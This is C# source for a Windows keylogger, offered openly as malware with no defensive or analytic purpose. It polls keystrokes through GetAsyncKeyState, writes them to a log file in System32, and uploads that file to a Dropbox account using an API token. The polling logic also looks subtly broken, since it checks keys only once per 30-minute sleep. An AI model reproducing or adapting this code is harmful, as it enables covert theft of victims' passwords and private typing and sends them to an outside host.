using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Dropbox.Api;
using Dropbox.Api.Files;

namespace Keylogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static async void UploadToDropbox(string file)
        {
            using (var dbx = new DropboxClient("DROPBOX-API-TOKEN-HERE"))
            {
                var fileName = Path.GetFileName(file);
                using (var memStream = new MemoryStream(File.ReadAllBytes(file)))
                {
                    var updated = await dbx.Files.UploadAsync(
                        "/" + fileName,
                        WriteMode.Overwrite.Instance,
                        body: memStream);
                }
            }
        }

        static void Main(string[] args)
        {
            string filePath = @"C:\Windows\System32\logs.txt"; //Path to the log file... You can also rename the "log.txt" to whatever you want.

            if (!Directory.Exists(Path.GetDirectoryName(filePath)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(filePath));
            }

            if (!File.Exists(filePath))
            {
                File.Create(filePath).Dispose();
            }

            while (true)
            {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        sb.Append((Keys)i + ", ");
                    }
                }

                if (sb.Length > 0)
                {
                    string data = sb.ToString();
                    data = data.Substring(0, data.Length - 2);
                    using (StreamWriter sw = File.AppendText(filePath))
                    {
                        sw.Write(data);
                    }

                    // Upload to Dropbox
                    UploadToDropbox(filePath);
                }

                Thread.Sleep(1800000); //Sleep for 30 minutes
            }
        }
    }
}
